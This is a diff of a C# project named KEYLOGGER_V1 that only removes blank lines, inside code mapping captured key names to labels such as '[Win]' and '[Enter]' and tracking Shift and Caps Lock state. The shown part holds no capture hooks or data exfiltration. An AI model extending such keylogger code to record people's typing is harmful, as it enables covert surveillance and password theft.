@@ -95,7 +95,6 @@ namespace KEYLOGGER_V1
 
             switch (Key)
             {
-
                 case "LWin":
                     return "[Win]";
                 case "LControlKey":
@@ -106,7 +105,6 @@ namespace KEYLOGGER_V1
                     return "[Alt]";
                 case "RMenu":
                     return "[Alt]";
-
                 case "Return":
                     txtTextoDigitadoLimpo.Text += Environment.NewLine; // pula uma linha no "txtTextoDigitadoLimpo".
                     return "[Enter]";
@@ -226,7 +224,6 @@ namespace KEYLOGGER_V1
                 case "F12":
                     return "[F12]";
                 default:
-
                     return Key;
             }
 
@@ -235,13 +232,10 @@ namespace KEYLOGGER_V1
         public string Monitoramento_Maisculas_Minusculas(string tecla)         //METODO: Monitora digitação de letras com o Capslook ou Shift Ativo.
         {
             string segundoCaracter = null;
-
             try
             {
                 string primeiroCaracter = tecla.Substring(0, 1);
-
                 segundoCaracter = tecla.Substring(1, 1);
-
                 return "";
 
             }
